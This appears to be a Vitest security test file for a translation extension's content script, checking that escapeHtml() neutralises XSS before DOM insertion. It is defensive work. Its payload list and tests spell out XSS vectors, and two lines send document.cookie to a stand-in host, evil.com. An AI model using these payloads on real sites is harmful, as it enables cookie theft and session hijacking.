/**
 * XSS Protection Security Tests
 *
 * Tests all innerHTML/DOM injection points against comprehensive XSS payloads.
 * Validates that escapeHtml() and DOM sanitization prevent script execution.
 */

import { describe, it, expect, beforeEach } from 'vitest';

// ── escapeHtml reimplementation (mirrors src/content/index.ts:940-944) ──
// The content script's escapeHtml uses DOM API: textContent → innerHTML.
// We replicate the exact same logic here for testing.
function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ── XSS payload vectors ──
const XSS_PAYLOADS = [
  { name: 'basic script tag', payload: '<script>alert(1)</script>' },
  { name: 'img onerror', payload: '<img src=x onerror="alert(1)">' },
  { name: 'svg onload', payload: '<svg/onload=alert(1)>' },
  { name: 'attribute breakout', payload: '"><script>alert(1)</script>' },
  { name: 'javascript URI', payload: 'javascript:alert(1)' },
  { name: 'iframe javascript', payload: '<iframe src="javascript:alert(1)">' },
  { name: 'body onload', payload: '<body onload=alert(1)>' },
  { name: 'input autofocus', payload: '<input onfocus=alert(1) autofocus>' },
  { name: 'marquee onstart', payload: '<marquee onstart=alert(1)>' },
  { name: 'details ontoggle', payload: '<details open ontoggle=alert(1)>' },
  {
    name: 'nested mutation XSS',
    payload:
      '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
  },
  {
    name: 'unicode escaped script',
    payload: '\u003cscript\u003ealert(1)\u003c/script\u003e',
  },
  {
    name: 'HTML entity encoded javascript URI',
    payload:
      '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>',
  },
] as const;

// Characters that must be escaped in any HTML context
const DANGEROUS_CHARS = ['<', '>', '"', "'", '&'];

describe('XSS Protection', () => {
  describe('escapeHtml() — core sanitization function', () => {
    it.each(XSS_PAYLOADS)(
      'neutralizes $name',
      ({ payload }) => {
        const escaped = escapeHtml(payload);
        // Core security property: all angle brackets must be entity-encoded.
        // This prevents the browser from parsing ANY HTML tags or attributes.
        // Event handlers like onerror= are harmless as plain text without
        // a real element to attach to.
        expect(escaped).not.toMatch(/<[a-zA-Z]/);
        expect(escaped).not.toMatch(/<\//);

        // Verify: inserting the escaped text into DOM creates no elements
        const container = document.createElement('div');
        container.innerHTML = escaped;
        expect(container.querySelectorAll('script')).toHaveLength(0);
        expect(container.querySelectorAll('img')).toHaveLength(0);
        expect(container.querySelectorAll('svg')).toHaveLength(0);
        expect(container.querySelectorAll('iframe')).toHaveLength(0);
        expect(container.querySelectorAll('a')).toHaveLength(0);
        expect(container.querySelectorAll('[onerror]')).toHaveLength(0);
        expect(container.querySelectorAll('[onload]')).toHaveLength(0);
      }
    );

    it('escapes all dangerous HTML characters', () => {
      const input = `<div class="x" data-a='y'>&test</div>`;
      const escaped = escapeHtml(input);
      expect(escaped).not.toMatch(/[<>]/);
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&amp;');
    });

    it('preserves safe plaintext content', () => {
      const safe = 'Hello world! This is a normal translation.';
      expect(escapeHtml(safe)).toBe(safe);
    });

    it('preserves unicode text (no mangling)', () => {
      const unicode = '日本語テスト — 中文 — العربية — 한국어';
      expect(escapeHtml(unicode)).toBe(unicode);
    });

    it('handles empty string', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('handles string with only angle brackets', () => {
      const escaped = escapeHtml('<<<>>>');
      expect(escaped).toBe('&lt;&lt;&lt;&gt;&gt;&gt;');
    });

    it('escapes nested/recursive payloads', () => {
      const nested = '<scr<script>ipt>alert(1)</scr</script>ipt>';
      const escaped = escapeHtml(nested);
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('<scr');
    });
  });

  describe('DOM insertion safety — innerHTML contexts', () => {
    let container: HTMLDivElement;

    beforeEach(() => {
      container = document.createElement('div');
      document.body.appendChild(container);
    });

    it('escaped content inserted via innerHTML does not create script elements', () => {
      const malicious = '<script>alert("xss")</script>';
      const escaped = escapeHtml(malicious);
      container.innerHTML = `<div class="translation">${escaped}</div>`;

      expect(container.querySelectorAll('script')).toHaveLength(0);
      expect(container.textContent).toContain('<script>alert("xss")</script>');
    });

    it('escaped content does not create event-handler attributes', () => {
      const malicious = '<img src=x onerror="document.cookie">';
      const escaped = escapeHtml(malicious);
      container.innerHTML = `<span>${escaped}</span>`;

      expect(container.querySelectorAll('img')).toHaveLength(0);
      expect(container.querySelectorAll('[onerror]')).toHaveLength(0);
    });

    it('hover tooltip pattern is safe with escaped text', () => {
      const text = '<script>steal(cookies)</script>';
      const translatedText = '<img src=x onerror="fetch(`evil.com?c=${document.cookie}`)">';
      // Mirrors the actual tooltip pattern from content/index.ts:871-875
      container.innerHTML = `
        <div class="hover-original">${escapeHtml(text)}</div>
        <div class="hover-arrow">-></div>
        <div class="hover-translation">${escapeHtml(translatedText)}</div>
      `;

      expect(container.querySelectorAll('script')).toHaveLength(0);
      expect(container.querySelectorAll('img')).toHaveLength(0);
      expect(container.querySelectorAll('[onerror]')).toHaveLength(0);
    });

    it('widget history pattern is safe with escaped text', () => {
      // Mirrors content/index.ts:1239-1248
      const history = [
        { original: '<script>alert(1)</script>', translated: '<img onerror=alert(1)>' },
        { original: 'normal text', translated: 'texte normal' },
      ];

      container.innerHTML = history
        .map(
          (h) => `
            <div style="padding: 4px 0; border-bottom: 1px solid #334155;">
              <div style="color: #64748b;">${escapeHtml(h.original.substring(0, 30))}${h.original.length > 30 ? '...' : ''}</div>
              <div style="color: #94a3b8;">${escapeHtml(h.translated.substring(0, 30))}${h.translated.length > 30 ? '...' : ''}</div>
            </div>
          `
        )
        .join('');

      expect(container.querySelectorAll('script')).toHaveLength(0);
      expect(container.querySelectorAll('img')).toHaveLength(0);
    });
  });

  describe('translation result sanitization', () => {
    it('provider response with script tags is escaped before DOM insertion', () => {
      // Simulates a malicious translation provider returning script content
      const maliciousTranslation = 'Bonjour <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';
      const escaped = escapeHtml(maliciousTranslation);

      const container = document.createElement('div');
      container.innerHTML = `<div class="hover-translation">${escaped}</div>`;

      expect(container.querySelectorAll('script')).toHaveLength(0);
      expect(container.textContent).toContain('Bonjour');
      expect(container.textContent).toContain('<script>');
    });

    it('provider response with event handlers is escaped', () => {
      const maliciousTranslation = 'Translated <div onmouseover="alert(1)">text</div>';
      const escaped = escapeHtml(maliciousTranslation);

      const container = document.createElement('div');
      container.innerHTML = escaped;

      expect(container.querySelectorAll('[onmouseover]')).toHaveLength(0);
      expect(container.querySelectorAll('div')).toHaveLength(0);
    });

    it('provider response with data URIs is neutralized', () => {
      const maliciousTranslation = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
      const escaped = escapeHtml(maliciousTranslation);

      const container = document.createElement('div');
      container.innerHTML = escaped;

      expect(container.querySelectorAll('a')).toHaveLength(0);
    });
  });

  describe('edge cases', () => {
    it('handles extremely long XSS payload without crash', () => {
      const longPayload = '<script>' + 'a'.repeat(100_000) + '</script>';
      const escaped = escapeHtml(longPayload);
      expect(escaped).not.toContain('<script');
    });

    it('handles null bytes in payload', () => {
      const payload = '<scr\0ipt>alert(1)</script>';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<scr');
    });

    it('handles mixed encoding attacks', () => {
      const payload = '%3Cscript%3Ealert(1)%3C/script%3E';
      const escaped = escapeHtml(payload);
      // URL-encoded payload should pass through as-is (harmless text)
      expect(escaped).toContain('%3C');
    });
  });
});
